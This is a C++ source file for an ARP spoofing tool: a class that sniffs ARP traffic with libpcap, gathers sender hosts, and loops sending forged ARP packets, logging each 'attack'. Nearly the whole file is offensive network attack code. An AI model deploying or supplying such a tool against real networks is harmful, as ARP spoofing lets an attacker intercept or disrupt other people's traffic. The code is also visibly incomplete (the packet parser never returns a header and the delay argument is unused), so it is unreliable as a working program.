#include <optional>
#include <netinet/in.h>
#include <iostream>
#include <pcap.h>
#include "arp/ARPSessionManager.cpp"

class ARPSpoofingAgent {
private:
    char* netInterface;
    std::pair<uint8_t*, uint8_t*>* sessionList;

    bool isBroadcast = false;
    ARPSessionManager* sendArpManager;

    std::optional<ARPHeader*> processARPPacket(const uint8_t *packet) {
        auto *etherHeader = (EtherHeader *) packet;
        if (ntohs(etherHeader->type) == ETHER_TYPE_ARP) {
            auto *arpHeader = (ARPHeader *) (packet + sizeof(EtherHeader));
            if (arpHeader->op_code == ARP_OPCODE_REPLY) {
            }
        }
        return {};
    }
public:
    const static int UNLIMITED = 0;

    ARPSpoofingAgent(char* netInterface, std::optional<std::pair<uint8_t*, uint8_t*>*> sessionList):
    netInterface(netInterface) {
        if (sessionList) this->sessionList = sessionList.value();
        else this->isBroadcast = true;
        this->sendArpManager = new ARPSessionManager(netInterface);
    }

    void buildSessions() {
        std::cout << "INFO: Start scanning sender clients..." << std::endl;

        char errBuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(this->netInterface, BUFSIZ, 1, 1000, errBuf);
        auto go = true;
        while (go) {
            struct pcap_pkthdr* header;
            const u_char* packet;
            pcap_next_ex(handle, &header, &packet);

            auto arpHeader = this->processARPPacket(packet);

            if (arpHeader) {
                if (this->sendArpManager->addSession(*arpHeader.value())) {
                    std::cout << "INFO: Collected ARP sender: " << arpHeader.value()->sender_ip << std::endl;
                    go = false;
                }
            }
        }

        std::cout << "INFO: Success scanning sender clients" << std::endl;
    }

    void startARPSpoofing(uint maxAttack, uint delay= 1) {
        std::cout << "INFO: Start ARP spoofing attack...." << std::endl;

        bool go = true;
        uint attackCount = 0;
        while (go) {
            std::cout << "[" << attackCount << "]" << " Send attack..." << std::endl;
            this->sendArpManager->sendARPPacket();
            attackCount++;
            if (attackCount > maxAttack and maxAttack != 0) go = false;
        }

        std::cout << "INFO: End ARP spoofing attack" << std::endl;}
};
